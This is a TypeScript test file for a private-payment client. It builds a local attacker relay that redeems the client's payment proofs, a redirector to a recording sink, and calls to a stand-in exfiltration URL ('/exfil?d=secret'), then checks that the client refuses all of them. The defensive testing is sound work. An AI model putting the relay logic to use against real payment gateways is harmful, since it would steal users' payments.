// A relay attack on the client, with a real gateway that credited the real published deposit (testnet) and
// a real attacker server in front of it. The attacker answers the agent's request with a challenge it
// fetched from the gateway for its own request, then redeems the agent's proof at the gateway.
import { createServer, type Server } from 'node:http';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { nullifierOf } from '@z402/circuits';
import { Gateway, readAnchor, serveGateway } from '@z402/gateway';
import { Z402Client, type ClientOptions } from '../src/index.js';

let opts: ClientOptions;

const d = JSON.parse(readFileSync(resolve(__dirname, '../../../deployments/testnet.json'), 'utf8'));
const dir = mkdtempSync(join(tmpdir(), 'z402-relay-'));
let gw: Gateway;
let base = '';
let relay = '';
const redeemed: number[] = [];
/** every request the attacker's relay receives, and every request a redirect target receives */
const relayHits: string[] = [];
const sinkHits: string[] = [];
let sink = '';
let redirector = '';
const servers: Server[] = [];
const listen = async (s: Server) => {
  servers.push(s);
  await new Promise<void>((r) => s.listen(0, '127.0.0.1', r));
  return `http://127.0.0.1:${(s.address() as AddressInfo).port}`;
};

beforeAll(async () => {
  gw = new Gateway({ statePath: join(dir, 'state.db'), depositUa: d.wallets.gateway.address, depositUivk: d.wallets.gateway.uivk, unitZat: d.unitZat, prices: { '/api/quote': 10n }, content: (p) => ({ served: p }), anchorUivk: d.wallets.anchor.uivk });
  await gw.claim(d.deposit.txid, d.deposit.items);
  // the run's real anchor (Oct 20), read on-chain with the anchor address's published viewing key
  await gw.adoptAnchor(d.anchor.txid);
  const a = await readAnchor(d.wallets.anchor.uivk, d.anchor.txid);
  // a replay of the Oct 20 run as of 10 blocks after its anchor, with the default window: a fixed scan range
  opts = { anchorUivk: d.wallets.anchor.uivk, replayAtHeight: a.height! + 10 };
  base = await listen(serveGateway(gw));
  // The attacker: /free costs the agent nothing it can see, and passes /api/info and /api/leaves through.
  relay = await listen(
    createServer(async (req, res) => {
      relayHits.push(req.url ?? '');
      const send = (status: number, body: string) => res.writeHead(status, { 'content-type': 'application/json' }).end(body);
      if (req.url === '/api/info' || req.url === '/api/leaves') return send(200, await (await fetch(base + req.url)).text());
      const header = req.headers['x-payment'];
      if (typeof header !== 'string') return send(402, await (await fetch(`${base}/api/quote`)).text());
      const r = await fetch(`${base}/api/quote`, { headers: { 'x-payment': header } });
      redeemed.push(r.status);
      return send(200, JSON.stringify({ free: true }));
    }),
  );
  // A server that records whatever reaches it, and a "gateway" that redirects every request to it.
  sink = await listen(
    createServer((req, res) => {
      sinkHits.push(req.url ?? '');
      res.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ q: req.url }));
    }),
  );
  redirector = await listen(createServer((req, res) => res.writeHead(302, { location: `${sink}${req.url}` }).end()));
  const notes = await Promise.all(d.fixtureNotes.map(async (n: Record<string, string>) => ({ ...n, deposit: 'published', spent: false, nullifier: (await nullifierOf({ noteSecret: BigInt(n.noteSecret), nullifierSecret: BigInt(n.nullifierSecret), value: BigInt(n.value) })).toString() })));
  writeFileSync(join(dir, 'notes.json'), JSON.stringify({ type: 'zec-null-402-notes', gateway: base, plans: {}, notes }), { mode: 0o600 });
}, 120_000);
afterAll(() => servers.forEach((s) => s.close()));

describe('the client pays only its own gateway, for the request it made', () => {
  it('a URL on another origin is never fetched: no request reaches it, so nothing can be sent out or relayed', async () => {
    const c = new Z402Client(base, join(dir, 'notes.json'), opts);
    await expect(c.pay(`${relay}/exfil?d=secret`)).rejects.toThrow(/refusing to fetch http:\/\/127\.0\.0\.1:\d+: this client only talks to its gateway/);
    await expect(c.pay(`${relay}/free`)).rejects.toThrow(/refusing to fetch/);
    expect(relayHits).toEqual([]);
    expect(redeemed).toEqual([]);
    expect(Object.keys(gw.state.nullifiers)).toHaveLength(0);
    expect(c.status()).toMatchObject({ credited: 2, unspent: 2 });
  }, 120_000);

  it('a challenge for another resource is refused even from the configured origin', async () => {
    const c = new Z402Client(relay, join(dir, 'notes.json'), opts);
    await expect(c.pay(`${relay}/free`)).rejects.toThrow(/refusing to pay.*\/api\/quote.*\/free/);
    expect(redeemed).toEqual([]);
    expect(Object.keys(gw.state.nullifiers)).toHaveLength(0);
  }, 120_000);

  it('a redirect from the gateway origin is not followed: the target receives nothing', async () => {
    const c = new Z402Client(redirector, join(dir, 'notes.json'), opts);
    await expect(c.pay(`${redirector}/api/quote?d=secret`)).rejects.toThrow();
    await expect(c.info()).rejects.toThrow();
    expect(sinkHits).toEqual([]);
    expect(Object.keys(gw.state.nullifiers)).toHaveLength(0);
  }, 120_000);

  it('its own gateway is still paid', async () => {
    const c = new Z402Client(base, join(dir, 'notes.json'), opts);
    expect((await c.pay(`${base}/api/quote`)).status).toBe(200);
    expect(Object.keys(gw.state.nullifiers)).toHaveLength(1);
  }, 120_000);
});
